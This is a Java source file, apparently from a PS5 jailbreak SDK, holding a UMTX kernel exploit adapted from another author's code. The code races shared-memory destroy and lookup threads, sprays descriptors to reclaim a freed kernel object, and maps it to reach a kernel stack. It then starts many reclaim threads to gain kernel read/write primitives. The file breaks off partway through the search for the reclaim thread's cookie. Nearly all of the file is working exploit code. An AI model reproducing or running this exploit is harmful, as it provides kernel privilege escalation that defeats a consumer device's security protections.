package org.ps5jb.client.payloads.umtx.impl2;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.client.payloads.umtx.common.KernelAddressClassifier;
import org.ps5jb.client.payloads.umtx.common.KernelOffsetsCalculator;
import org.ps5jb.client.payloads.umtx.common.KernelStabilizer;
import org.ps5jb.client.payloads.umtx.common.MemoryDumper;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.core.kernel.KernelAccessorIPv6;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.include.PThread;
import org.ps5jb.sdk.include.PThreadNp;
import org.ps5jb.sdk.include.sys.pthreadtypes.PThreadType;
import org.ps5jb.sdk.lib.LibKernel;

/**
 * UMTX exploit from cheburek3000, adapted for this SDK:
 * https://github.com/cheburek3000/bdj-sdk/blob/umtx/samples/ps5-payload-loader/src/org/homebrew/umtx/Exploit.java
 */
public class UmtxExploitJob implements Runnable {
    private LibKernel mainLibKernel = new LibKernel();

    // Constants
    private static final int UMTX_OP_SHM = 26; // 25 on BSD
    private static final int UMTX_SHM_CREAT = 0x0001;
    private static final int UMTX_SHM_LOOKUP = 0x0002;
    private static final int UMTX_SHM_DESTROY = 0x0004;

    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;

    private static final short RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;

    private static final int OFFSET_STAT_SIZE = 0x48;

    private static final int PROT_READ = 0x1;
    private static final int PROT_WRITE = 0x2;
    private static final int MAP_SHARED = 0x1;

    // Configuration for race
    static short MAIN_THREAD_CORE = 0;
    static final short MAIN_THREAD_PRIO = 256;
    static short[] DESTROYER_THREAD_CORE = new short[] { 1, 2 };
    static final short[] DESTROYER_THREAD_PRIO = new short[] { 256, 256 };
    static short LOOKUP_THREAD_CORE = 3;
    static final short LOOKUP_THREAD_PRIO = 767;
    static short KPRIM_THREAD_CORE = LOOKUP_THREAD_CORE;
    static final short KPRIM_THREAD_PRIO = 450;

    private static final int NUM_RACE_ATTEMPTS = 0x10000;
    private static int SPRAY_FDS_PER_THREAD = 0x28;

    // Configuration for post exploit
    static final long PIPE_SLOW_SIZE = 0x10000;
    static final long PIPE_SLOW_BATCH_SIZE = 0x1000;

    // UMTX key area
    private Pointer shmKey;
    private Pointer fstatBuf;

    // pid for searching for this process later
    private int ourPid;

    // Addresses mapped with mmap which may be corrupted at the end of execution
    private Set mappedKernelStackAddresses;

    // test pipes
    private Pointer pipeTestFds;
    private int pipeTestReadFd = -1;
    private int pipeTestWriteFd = -1;
    private Pointer pipeTestScratchBuf;

    // indicator that the job has finished running
    public volatile boolean finished = false;

    static int pinToCoreSelf(int core, LibKernel libKernel) {
        Pointer mask = Pointer.calloc(CPU_SETSIZE);
        try {
            int byteIdx = core / 8;
            int bitIdx = core % 8;
            mask.write1(byteIdx, (byte) (1 << bitIdx));
            return libKernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
                    -1, CPU_SETSIZE, mask);
        } finally {
            mask.free();
        }
    }

    static int setRtprioSelf(short value, LibKernel libkernel) {
        Pointer prio = Pointer.calloc(0x4);
        try {
            prio.write2(RTP_PRIO_REALTIME);
            prio.write2(2, value);
            return libkernel.rtprio_thread(RTP_SET, 0, prio);
        } finally {
            prio.free();
        }
    }

    private static int UmtxShmCreate(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_CREAT, key, Pointer.NULL);
    }

    private static int UmtxShmDestroy(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_DESTROY, key, Pointer.NULL);
    }

    private static int UmtxShmLookup(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_LOOKUP, key, Pointer.NULL);
    }

    private static int ShmResizeTag(int fd, LibKernel libkernel) {
        return libkernel.ftruncate(fd, fd * 0x4000L);
    }

    private static int ShmClose(int fd, LibKernel libkernel) {
        return libkernel.close(fd);
    }

    private int GetShmTag(int fd, LibKernel libkernel) {
        int returnCode;
        returnCode = libkernel.fstat(fd, fstatBuf);
        if (returnCode != 0) {
            return returnCode;
        }
        int tag = fstatBuf.read4(OFFSET_STAT_SIZE);
        if ((tag & 0x3FFF) != 0) {
            tag = fd;
        } else {
            tag /= 0x4000;
            if (tag >= 0x400 || tag <= 0x6) {
                tag = fd;
            }
        }
        return tag;
    }

    public int prepare() {
        int returnCode = 0;

        // On lower firmware, don't need to spray much. Makes the process faster
        int swVer = mainLibKernel.getSystemSoftwareVersion();
        if (swVer < 0x0300) {
            SPRAY_FDS_PER_THREAD = 1;
            NUM_KPRIM_THREADS = 20;
        }

        // Create a UMTX key area to use, these just have to be valid pointers
        this.shmKey = Pointer.calloc(0x1000);

        // Create buffer for fstat
        this.fstatBuf = Pointer.calloc(0x100);

        // Pin main thread to core 1 with high prio
        returnCode = pinToCoreSelf(MAIN_THREAD_CORE, mainLibKernel);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to pin main thread, returnCode: " + returnCode);
            return returnCode;
        }
        returnCode = setRtprioSelf(MAIN_THREAD_PRIO, mainLibKernel);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to set main thread prio, returnCode: " + returnCode);
            return returnCode;
        }
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] Main thread on cpu: " + mainLibKernel.sceKernelGetCurrentCpu());
        }

        // Get pid for searching for this process later
        this.ourPid = mainLibKernel.getpid();
        DebugStatus.info("[+] pid: " + this.ourPid);

        this.mappedKernelStackAddresses = new HashSet();

        // Create pipe for testing memory
        this.pipeTestFds = Pointer.calloc(8);
        returnCode = mainLibKernel.pipe(this.pipeTestFds);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to create test pipe, returnCode: " + returnCode);
            return returnCode;
        }
        this.pipeTestReadFd = pipeTestFds.read4();
        this.pipeTestWriteFd = pipeTestFds.read4(4);
        this.pipeTestScratchBuf = Pointer.calloc(PIPE_SLOW_SIZE);

        kPrimPrepare();

        return 0;
    }

    public void cleanup() {
        // Cleans up all the native allocations at the end of execution
        if (shmKey != null) {
            shmKey.free();
        }

        if (fstatBuf != null) {
            fstatBuf.free();
        }

        if (pipeTestFds != null) {
            pipeTestFds.free();
        }

        if (pipeTestReadFd != -1) {
            mainLibKernel.close(pipeTestReadFd);
        }

        if (pipeTestWriteFd != -1) {
            mainLibKernel.close(pipeTestWriteFd);
        }

        if (pipeTestScratchBuf != null) {
            pipeTestScratchBuf.free();
        }
    }

    class Sychronizer {
        public AtomicBoolean runSignal;
        public AtomicBoolean resetSignal;
        public AtomicBoolean stopSignal;
        public AtomicInteger waitingReadyCounter;
        public AtomicInteger waitingResetCounter;
        private int numJobs;

        public Sychronizer(int numJobs) {
            this.numJobs = numJobs;
            runSignal = new AtomicBoolean();
            resetSignal = new AtomicBoolean();
            stopSignal = new AtomicBoolean();
            waitingReadyCounter = new AtomicInteger();
            waitingResetCounter = new AtomicInteger();
        }

        void runWhenAllReady() {
            while (waitingReadyCounter.get() != numJobs) {
                Thread.yield();
            }
            resetSignal.set(false);
            runSignal.set(true);
        }

        void waitAllDone() {
            while (waitingResetCounter.get() != numJobs) {
                Thread.yield();
            }
        }

        void stop() {
            stopSignal.set(true);
            reset();
        }

        void reset() {
            waitingReadyCounter.set(0);
            waitingResetCounter.set(0);
            runSignal.set(false);
            resetSignal.set(true);
        }
    }

    class SynchronizedRepeatableJob implements Runnable {
        protected LibKernel libkernel;

        protected String name;
        private short core;
        private short prio;
        private Sychronizer sync;

        public SynchronizedRepeatableJob(String name, short core, short prio, Sychronizer sync) {
            this.name = name;
            this.core = core;
            this.prio = prio;
            this.sync = sync;
            this.libkernel = new LibKernel();
        }

        @Override
        public void run() {
            prepare();
            loop();
            cleanup();
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": stopped");
            }
        }

        private void prepare() {
            int returnCode;
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] " + this.name + ": pinning thread to " + this.core);
            }
            returnCode = pinToCoreSelf(this.core, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] " + this.name + ": failed to pin thread, returnCode: " + returnCode);
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": setting prio " + this.prio);
            }
            returnCode = setRtprioSelf(this.prio, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] " + this.name + ": failed to set prio, returnCode: " + returnCode);
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": prepared on cpu " + libkernel.sceKernelGetCurrentCpu());
            }
        }

        private void loop() {
            while (!sync.stopSignal.get()) {
                before();
                sync.waitingReadyCounter.incrementAndGet();
                while (!sync.runSignal.get()) {
                    Thread.yield();
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": work");
                }
                work();
                sync.waitingResetCounter.incrementAndGet();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": waiting for reset");
                }
                while (!sync.resetSignal.get()) {
                    Thread.yield();
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": resetting");
                }
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": finished");
            }
        }

        protected void before() {
            Thread.yield();
        }

        protected void work() {
            Thread.yield();
        }

        protected void cleanup() {
            this.libkernel.closeLibrary();
        }
    }

    class DestroyerJob extends SynchronizedRepeatableJob {
        private AtomicInteger destructionsCounter;
        private Pointer shmKey;
        private int[] sprayFds;
        private Pointer sprayShmKey;
        private int extraShmFd = -1;
        private Pointer extraShmKey;

        public DestroyerJob(String name, short core, short prio, Sychronizer sync, AtomicInteger destructionsCounter,
                            Pointer shmKey, Pointer sprayShmKey) {
            super(name, core, prio, sync);
            this.destructionsCounter = destructionsCounter;
            this.shmKey = shmKey;
            this.sprayFds = new int[SPRAY_FDS_PER_THREAD];
            this.sprayShmKey = sprayShmKey;
            this.extraShmKey = Pointer.calloc(0x80);
        }

        @Override
        protected void before() {
            extraShmFd = UmtxShmCreate(extraShmKey, libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": created extra " + extraShmFd);
            }
        }

        @Override
        protected void work() {
            int result = UmtxShmDestroy(shmKey, libkernel);
            int returnCode;
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": destroyed, result: " + result);
            }
            if (result == 0) {
                this.destructionsCounter.incrementAndGet();
            }
            for (int i = 0; i < SPRAY_FDS_PER_THREAD; ++i) {
                Pointer sprayFdKey = sprayShmKey.inc(i * 0x8L);
                sprayFds[i] = UmtxShmCreate(sprayFdKey, libkernel);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": created " + sprayFds[i]);
                }
                returnCode = ShmResizeTag(sprayFds[i], libkernel);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": resized, returnCode " + returnCode);
                }
                returnCode = UmtxShmDestroy(sprayFdKey, libkernel);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": destroyed, returnCode " + returnCode);
                }
            }
            returnCode = UmtxShmDestroy(extraShmKey, libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": destroyed extra, returnCode " + returnCode);
            }
        }

        @Override
        protected void cleanup() {
            if (extraShmKey != null) {
                extraShmKey.free();
            }

            super.cleanup();
        }
    }

    class LookupJob extends SynchronizedRepeatableJob {
        private AtomicInteger lookupFd;
        private Pointer shmKey;

        public LookupJob(String name, short core, short prio, Sychronizer sync, AtomicInteger lookupFd, Pointer shmKey) {
            super(name, core, prio, sync);
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmLookup(shmKey, libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": looked up, result: " + result);
            }
            lookupFd.set(result);
        }
    }

    public class RaceResult {
        public int returnCode;
        public int numTries;
        public int lookupFd;
        public int reclaimFd;

        public RaceResult(int returnCode) {
            this.returnCode = returnCode;
        }

        public RaceResult(int numTries, int lookupFd, int reclaimFd) {
            this.returnCode = 0;
            this.numTries = numTries;
            this.lookupFd = lookupFd;
            this.reclaimFd = reclaimFd;
        }
    }

    public RaceResult race() {
        Sychronizer destroyerLookupSync = new Sychronizer(3);
        AtomicInteger destructionsCounter = new AtomicInteger();
        AtomicInteger lookupFd = new AtomicInteger();
        int reclaimFd = -1;

        DestroyerJob[] destroyerJobs = new DestroyerJob[2];
        Thread[] destroyerThreads = new Thread[2];
        for (int i = 0; i < 2; i++) {
            destroyerJobs[i] = new DestroyerJob("destroyer[" + i + "]", DESTROYER_THREAD_CORE[i],
                    DESTROYER_THREAD_PRIO[i], destroyerLookupSync, destructionsCounter, this.shmKey,
                    this.shmKey.inc(0x8 * (SPRAY_FDS_PER_THREAD * i + 1)));
            destroyerThreads[i] = new Thread(destroyerJobs[i]);
        }
        for (int i = 0; i < 2; i++) {
            destroyerThreads[i].start();
        }

        LookupJob lookupJob = new LookupJob("lookup", LOOKUP_THREAD_CORE, LOOKUP_THREAD_PRIO, destroyerLookupSync,
                lookupFd, this.shmKey);
        Thread lookupThread = new Thread(lookupJob);
        lookupThread.start();
        int numAttemts = 0;
        int numDC2 = 0;
        int numSprays = 0;

        for (int attempt = 0; attempt < NUM_RACE_ATTEMPTS; ++attempt) {
            numAttemts++;
            if ((numAttemts % 200) == 0) {
                DebugStatus.info("[+] Race attempt " + numAttemts);
            }
            // prepare
            int descriptor = UmtxShmCreate(this.shmKey, this.mainLibKernel);
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] created descriptor " + descriptor);
            }
            int returnCode;
            returnCode = ShmResizeTag(descriptor, this.mainLibKernel);
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] ShmResizeTag returned " + returnCode);
            }
            returnCode = ShmClose(descriptor, this.mainLibKernel);
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] ShmClose returned " + returnCode);
            }

            // run
            destroyerLookupSync.runWhenAllReady();

            // check
            destroyerLookupSync.waitAllDone();
            if (destructionsCounter.get() == 2) {
                numDC2++;
            }
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] destructionsCounter: " + destructionsCounter.get());
            }
            if (lookupFd.get() == -1) {
                DebugStatus.debug("[-] lookup failed");
            } else if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] lookup succeeded, lookupFd: " + lookupFd.get());
            }
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                numSprays++;
                DebugStatus.info("[+] destructionsCounter: " + destructionsCounter.get() + ", lookupFd: " + lookupFd.get());
                reclaimFd = GetShmTag(lookupFd.get(), mainLibKernel);
                DebugStatus.info("[+] reclaimFd: " + reclaimFd);
            }
            destructionsCounter.set(0);

            for (int i = 0; i < destroyerJobs.length; ++i) {
                for (int j = 0; j < destroyerJobs[i].sprayFds.length; ++j) {
                    int sprayFd = destroyerJobs[i].sprayFds[j];
                    if (sprayFd != reclaimFd && sprayFd != -1 && sprayFd != 0) {
                        ShmClose(sprayFd, mainLibKernel);
                    }
                }
                if (destroyerJobs[i].extraShmFd != -1) {
                  ShmClose(destroyerJobs[i].extraShmFd, mainLibKernel);
                }
            }

            if (reclaimFd != -1 && reclaimFd != lookupFd.get() && reclaimFd != descriptor) {
                DebugStatus.info("[+] reclaimed: " + reclaimFd + " != " + lookupFd.get() + " != " + descriptor);
                DebugStatus.info("[+] Race succeeded, numAttempts: " + numAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
                destroyerLookupSync.stop();
                return new RaceResult(attempt + 1, lookupFd.get(), reclaimFd);
            } else {
                reclaimFd = -1;
            }

            // finalize
            if (lookupFd.get() != -1) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] closing not reclaimed lookupFd: " + lookupFd);
                }
                returnCode = ShmClose(lookupFd.get(), mainLibKernel);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] ShmClose(" + lookupFd + ") returned " + returnCode);
                }
            }
            if (attempt + 1 == NUM_RACE_ATTEMPTS) {
                destroyerLookupSync.stop();
            } else {
                destroyerLookupSync.reset();
            }
        }
        if (DebugStatus.isDebugEnabled()) {
            DebugStatus.debug("[-] Race failed, numAttemts: " + numAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
        }
        return new RaceResult(-1);
    }

    static final int KPRIM_NOP   = 0;
    static final int KPRIM_READ  = 1;
    static final int KPRIM_WRITE = 2;
    static final int KPRIM_BUF_SIZE = 0x8;
    private static int NUM_KPRIM_ATTEMPTS = 2;
    private static int NUM_KPRIM_THREADS = 0x100;

    class KPrimThreadData {
        private LibKernel libkernel;

        public AtomicBoolean neoFound;
        public AtomicInteger neo;
        public AtomicInteger selectedOnceCounter;
        public AtomicInteger cmd;
        public AtomicLong uaddr;
        public AtomicLong kaddr;
        public AtomicInteger len;
        public AtomicLong readCounter;
        public AtomicLong writeCounter;

        // Pipe for read/write prim via stack reads/writes
        public Pointer pipeSlowFds;
        public int pipeSlowReadFd = -1;
        public int pipeSlowWriteFd = -1;
        public Pointer pipeSlowScratchBuf;

        public Pointer slowReadWriteBuf;
        public Pointer slowReadValue;
        public Pointer slowWriteValue;

        KPrimThreadData() {
            this.libkernel = new LibKernel();
            this.neoFound = new AtomicBoolean();
            this.neo = new AtomicInteger();
            this.selectedOnceCounter = new AtomicInteger();
            this.cmd = new AtomicInteger(KPRIM_NOP);
            this.uaddr = new AtomicLong();
            this.kaddr = new AtomicLong();
            this.len = new AtomicInteger();
            this.readCounter = new AtomicLong();
            this.writeCounter = new AtomicLong();
            resetToDefaults();

            // Create pipe for read/write prim via stack reads/writes
            this.pipeSlowFds = Pointer.calloc(8);
            int returnCode = libkernel.pipe(this.pipeSlowFds);
            if (returnCode < 0) {
                DebugStatus.error("[-] Failed to create pipe, returnCode: " + returnCode);
                throw new RuntimeException("Initialization failed");
            }
            this.pipeSlowReadFd = this.pipeSlowFds.read4();
            this.pipeSlowWriteFd = this.pipeSlowFds.read4(4);
            this.pipeSlowScratchBuf = Pointer.calloc(PIPE_SLOW_SIZE);

            this.slowReadWriteBuf = Pointer.calloc(0x4000);
            this.slowReadValue = Pointer.calloc(KPRIM_BUF_SIZE);
            this.slowWriteValue = Pointer.calloc(KPRIM_BUF_SIZE);
        }

        public void resetToDefaults() {
            this.neoFound.set(false);
            this.neo.set(-1);
            this.selectedOnceCounter.set(0);
            this.cmd.set(KPRIM_NOP);
            this.uaddr.set(0);
            this.kaddr.set(0);
            this.len.set(0);
            this.readCounter.set(0);
            this.writeCounter.set(0);
        }

        public void cleanup() {
            if (pipeSlowFds != null) {
                pipeTestFds.free();
            }

            if (pipeSlowReadFd != -1) {
                libkernel.close(pipeSlowReadFd);
            }

            if (pipeSlowWriteFd != -1) {
                libkernel.close(pipeSlowWriteFd);
            }

            if (slowReadWriteBuf != null) {
                slowReadWriteBuf.free();
            }

            if (slowReadValue != null) {
                slowReadValue.free();
            }

            if (slowWriteValue != null) {
                slowWriteValue.free();
            }
        }
    }

    class KPrimJob implements Runnable {
        private LibKernel libkernel;

        private int id;
        private short core;
        private short prio;
        private KPrimThreadData threadData;
        public AtomicBoolean exitSignal;
        private boolean selectedOnce;
        private boolean lastAttempt;

        private long cookie;
        private Pointer cookieBuf;
        private Pointer timeoutBuf;

        public KPrimJob(int id, short core, short prio, KPrimThreadData threadData) {
            this.id = id;
            this.core = core;
            this.prio = prio;
            this.threadData = threadData;
            this.exitSignal = new AtomicBoolean();
            cookie = (0x13370000 + id) << 32;
            this.libkernel = new LibKernel();
            cookieBuf = Pointer.calloc(0x100);
            timeoutBuf = Pointer.calloc(0x10);
            timeoutBuf.write8(0); // tv_sec
            timeoutBuf.write8(8, 500000); // tv_usec
        }

        public void resetToDefaults(boolean lastAttempt) {
            this.exitSignal.set(false);
            this.selectedOnce = false;
            this.lastAttempt = lastAttempt;
        }

        @Override
        public void run() {
            prepare();
            loop();
            if (lastAttempt) {
                cleanup();
            }
        }

        private void prepare() {
            int returnCode;
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] kprim[" + this.id + "]: pinning thread to " + this.core);
            }
            returnCode = pinToCoreSelf(this.core, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] kprim[" + this.id + "]: failed to pin thread, returnCode: " + returnCode);
            }
            if (this.prio != 0) {
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("[+] " + this.id + ": setting prio " + this.prio);
                }
                returnCode = setRtprioSelf(this.prio, this.libkernel);
                if (returnCode < 0) {
                    DebugStatus.error("[-] " + this.id + ": failed to set prio, returnCode: " + returnCode);
                }
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] kprim[" + this.id + "]: prepared on cpu " + libkernel.sceKernelGetCurrentCpu());
            }

            // Set native thread name to find it later
            try {
                PThread pthreadLib = new PThread(libkernel);
                PThreadNp pthreadNpLib = new PThreadNp(libkernel);

                PThreadType pthread = pthreadLib.self();
                pthreadNpLib.rename(pthread, "reclaim#" + id);
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] renamed reclaim#" + id + " native thread.");
                }
            } catch (SdkException | RuntimeException | Error e) {
                DebugStatus.error("[-] failed to rename the native thread of reclaim#" + id);
            }
        }

        private void loop() {
            while (!exitSignal.get()) {
                if (threadData.neoFound.get()) {
                    if (threadData.neo.get() != id) {
                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("[+] kprim[" + this.id + "]: neo found, not me, exiting");
                        }
                        exitSignal.set(false);
                        return;
                    }

                    int cmd = threadData.cmd.get();
                    if (cmd == KPRIM_NOP) {
                        Thread.yield();
                        continue;
                    }
                    long len = threadData.len.get();

                    switch (cmd) {
                        case KPRIM_READ:
                            if (DebugStatus.isDebugEnabled()) {
                                DebugStatus.debug("[+] kprim[" + this.id + "]: reading " + len + " bytes");
                            }
                            threadData.readCounter.incrementAndGet();
                            long read = libkernel.write(threadData.pipeSlowWriteFd, threadData.pipeSlowScratchBuf, len);
                            if (DebugStatus.isDebugEnabled()) {
                                DebugStatus.debug("[+] kprim[" + this.id + "]: read " + read);
                            }
                            break;

                        case KPRIM_WRITE:
                            if (DebugStatus.isDebugEnabled()) {
                                DebugStatus.debug("[+] kprim[" + this.id + "]: writing");
                            }
                            threadData.writeCounter.incrementAndGet();
                            long write = libkernel.read(threadData.pipeSlowReadFd, threadData.pipeSlowScratchBuf, len);
                            if (DebugStatus.isDebugEnabled()) {
                                DebugStatus.debug("[+] kprim[" + this.id + "]: write " + write);
                            }
                            break;

                        default:
                            DebugStatus.error("[-] kprim[" + this.id + "]: unknown command");
                    }

                    threadData.cmd.set(KPRIM_NOP);

                    if (DebugStatus.isNoticeEnabled()) {
                        DebugStatus.notice("[+] kprim[" + this.id + "]: resetting");
                    }
                } else {
                    cookieBuf.write8(cookie);
                    int returnCode = libkernel.select(1, cookieBuf, Pointer.NULL, Pointer.NULL, timeoutBuf);
                    if (returnCode < 0) {
                        DebugStatus.error("[-] " + this.id + ": failed to select, returnCode: " + returnCode);
                    }
                    if (!selectedOnce) {
                        selectedOnce = true;
                        threadData.selectedOnceCounter.incrementAndGet();
                    }

                    Thread.yield();
                }
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] kprim[" + this.id + "]: finished");
            }
        }

        private void cleanup() {
            if (cookieBuf != null) {
                cookieBuf.free();
            }

            if (timeoutBuf != null) {
                timeoutBuf.free();
            }

            libkernel.closeLibrary();
        }
    }

    private KPrimThreadData kPrimThreadData;
    private KPrimJob[] kPrimJobs;
    private Thread[] kPrimThreads;

    private void kPrimPrepare() {
        kPrimThreadData = new KPrimThreadData();
        kPrimJobs = new KPrimJob[NUM_KPRIM_THREADS];
        kPrimThreads = new Thread[NUM_KPRIM_THREADS];
        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            kPrimJobs[i] = new KPrimJob(i, KPRIM_THREAD_CORE, KPRIM_THREAD_PRIO, kPrimThreadData);
        }
    }

    public static class RWResult {
        public int returnCode;

        public RWResult(int returnCode) {
            this.returnCode = returnCode;
        }
    }

    private boolean isMemoryReadable(Pointer kstack, LibKernel libkernel) {
        long returnCode = libkernel.write(this.pipeTestWriteFd, kstack, 1);
        if (returnCode < 0) {
            DebugStatus.error("[-] isMemoryReadable: failed to read from mem, errno: " + libkernel.__error().read4());
            return false;
        }
        returnCode = libkernel.read(this.pipeTestReadFd, this.pipeTestScratchBuf, returnCode);
        if (returnCode < 0) {
            DebugStatus.error("[-] isMemoryReadable: failed to read from pipe, errno: " + libkernel.__error().read4());
        }
        return true;
    }

    private void stopBadKprimThreads(int neo) {
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] stopping kprim threads except " + neo);
        }
        kPrimThreadData.neo.set(neo);
        kPrimThreadData.neoFound.set(true);

        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            if (i != neo) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] stopping kprim[" + i + "]");
                }
                try {
                    kPrimThreads[i].join();
                } catch (InterruptedException e) {
                    DebugStatus.error("[-] stopping kprim[" + i + "] failed");
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] stopped kprim[" + i + "]");
                }
            }
        }
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] kprim threads stopped");
        }
    }

    public RWResult getRW(int lookupFd, int reclaimFd) {
        int returnCode;

        // We have 2 fd referencing a shmfd which will be free'd if we close 1 fd...do that
        returnCode = ShmClose(reclaimFd, this.mainLibKernel);
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] Closed reclaimFd, returnCode: " + returnCode);
        }

        // mmap using the remaining fd to reference the free'd but still initialized vmobject.
        Pointer kstack = this.mainLibKernel.mmap(Pointer.NULL, 0x4000, PROT_READ | PROT_WRITE,
                MAP_SHARED, lookupFd, 0);
        if (kstack.addr() < 0) {
            DebugStatus.error("[-] Unable to mmap lookupFd, kstack: " + kstack);
            return new RWResult(-1);
        }
        DebugStatus.info("[+] kstack: " + kstack);

        int neo = -1;

        for (int attempt = 0; attempt < NUM_KPRIM_ATTEMPTS; ++attempt) {
            boolean lastAttempt = (attempt + 1) == NUM_KPRIM_ATTEMPTS;
            kPrimThreadData.resetToDefaults();
            for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] Starting kPrimThread[" + i + "]");
                }
                kPrimJobs[i].resetToDefaults(lastAttempt);
                kPrimThreads[i] = new Thread(kPrimJobs[i]);
                kPrimThreads[i].start();
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] Started kPrimThread[" + i + "]");
                }
            }
            DebugStatus.info("[+] Started kprim threads. Attempt " + (attempt + 1) + " of " + NUM_KPRIM_ATTEMPTS);

            boolean kstackValid = false;

            while (kPrimThreadData.selectedOnceCounter.get() < NUM_KPRIM_THREADS) {
                try {
                    Thread.sleep(500L);
                } catch (InterruptedException e) {
                    // Ignore
                }
                DebugStatus.info("[+] Waiting for all threads to work at least once, current count: "
                        + kPrimThreadData.selectedOnceCounter.get());
            }

            DebugStatus.info("[+] Checking kstack memory to be readable");
            if (!isMemoryReadable(kstack, this.mainLibKernel)) {
                // TODO: debug
                if (lastAttempt) {
                    DebugStatus.info("[-] Memory still is not readable, unmapping");
                    if (mainLibKernel.munmap(kstack, 0x4000) == -1) {
                        DebugStatus.error("[-] Failed to unmap memory after failure");
                    } else {
                        kstack = Pointer.NULL;
                    }
                } else {
                    DebugStatus.info("[+] Memory is not readable, trying again");
                }
                stopBadKprimThreads(-1);
                continue;
            }

            DebugStatus.info("[+] Checking kstack is not zeros");
            for (int i = 0; i < 0x1000; i += 0x8) {
                long test_qword = kstack.read8(0x3000 + i);
                if (test_qword != 0) {
                    kstackValid = true;
                    break;
                }
            }

            if (!kstackValid) {
                DebugStatus.info("[-] Failed to reclaim with kernel stack, trying again");
                stopBadKprimThreads(-1);
                continue;
            }

            DebugStatus.info("[+] kernel stack dump:");
            MemoryDumper.dump(kstack.inc(0x3000), 0x1000L);

            DebugStatus.info("[+] looking for cookie");
            for (int i = 0x3002; i < 0x4000; i += 0x2) {
                short dword = kstack.read2(i);
                if (dword == 0x1337) {
                    DebugStatus.info("[+] cookie found at 0x" + Long.toHexString(i));
                    neo = kstack.read2(i - 2);
                    DebugStatus.info("[+] reclaim thread index " + neo);

                    // Webkit implementation uses fixed offset from the cookie
                    // to get the thread. It's probably specific to sched_yield method.
                    // This implementation does not rely on this method but printing
                    // one candidate to compare if it's still fixed.
                    final long potentialThreadOffset = i - 2 + 0x128;
                    if (potentialThreadOffset + 8 <= 0x4000) {
                        KernelPointer threadPtr = KernelPointer.valueOf(kstack.read8(potentialThreadOffset));
